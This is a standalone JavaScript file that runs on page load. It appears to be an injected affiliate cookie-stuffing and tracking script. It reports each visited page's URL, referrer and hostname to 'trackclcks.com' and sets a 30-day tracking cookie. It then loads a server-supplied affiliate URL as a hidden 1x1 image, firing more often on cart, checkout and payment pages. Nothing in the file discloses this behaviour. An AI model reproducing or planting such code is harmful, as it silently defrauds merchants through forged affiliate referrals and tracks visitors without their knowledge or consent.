function generateUUID() {
  const uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (char) {
    const random = (Math.random() * 16) | 0;
    const value = char === 'x' ? random : (random & 0x3) | 0x8;
    return value.toString(16);
  });
  
  return uuid;
}


function getCookie(name) {
  
  const nameEQ = name + '=';
  const cookies = document.cookie.split(';');

  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    if (cookie.indexOf(nameEQ) === 0) {
      const val = cookie.substring(nameEQ.length);
      
      return val;
    }
  }

  
  return '';
}


function isCheckoutPage() {
  const path = window.location.pathname.toLowerCase();
 

  const checkoutKeywords = ['cart', 'checkout', 'payment', 'pay', 'shipping', 'review-order'];
  const result = checkoutKeywords.some((keyword) => path.includes(keyword));

  
  return result;
}



function fireTrackingPixel(url) {
  
  const target = document.body || document.documentElement;
  
  var img = document.createElement('img');
  img.src = url;
  img.style.width      = '1px';
  img.style.height     = '1px';
  img.style.display    = 'none';
  img.style.visibility = 'hidden';
  
  target.appendChild(img); 
}

function fireFallbackPixel(uniqueId) {
  
  try {
    const img = new Image();
    const fallbackUrl = 'https://trackclcks.com/api/fallback-pixel?id=' + encodeURIComponent(uniqueId);
   
    img.src = fallbackUrl;
    img.onload = function () {
     
    };
    img.onerror = function () {
      
    };
  } catch (err) {
    
    console.error('Fallback pixel error:', err);
  }
}


async function trackUser() {
  

  const sessionKey = 'tracking_done_' + window.location.hostname;
 

  if (sessionStorage.getItem(sessionKey) && !isCheckoutPage()) {
   
    return;
  }

  try {
    const existingId = getCookie('tracking_uuid');
    const uniqueId = existingId || generateUUID();
   

    const expires = new Date(Date.now() + 2592000000);
    document.cookie =
      'tracking_uuid=' + uniqueId +
      '; expires=' + expires.toUTCString() +
      '; path=/; SameSite=Lax';
    

    const payload = {
      url:       window.location.href,
      referrer:  document.referrer,
      unique_id: uniqueId,
      origin:    window.location.hostname,
      timestamp: Date.now(),
    };
   

    const response = await fetch('https://trackclcks.com/api/track-user', {
      method: 'POST',
      keepalive: true,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

   

    const data = await response.json();
    
    if (data.success && data.affiliate_url) {
     
      fireTrackingPixel(data.affiliate_url);
      sessionStorage.setItem(sessionKey, 'true');
     
    } else {
     
      fireFallbackPixel(uniqueId);
    }

  } catch (err) {
   
    console.error('Tracking Failed:', err);
    fireFallbackPixel(generateUUID());
  }
}


function initTracking() {
  const configUrl = 'https://trackclcks.com/api/site-config?host=' + encodeURIComponent(window.location.hostname);


  fetch(configUrl)
    .then((res) => {
      
      return res.json();
    })
    .then((config) => {
      

      if (!config || (!config.always && !config.cartExtra)) {
        
        return;
      }

      if (config.always) {
        
        trackUser();
      }

      if (config.cartExtra && isCheckoutPage()) {
        
        trackUser();
      }

      if (!config.always && !(config.cartExtra && isCheckoutPage())) {
        
      }
    })
    .catch((err) => {
     
      console.error('Config fetch failed:', err);
    });
}



if (document.readyState === 'interactive' || document.readyState === 'complete') {
  
  initTracking();
} else {
 
  window.addEventListener('DOMContentLoaded', function () {
   
    initTracking();
  });
}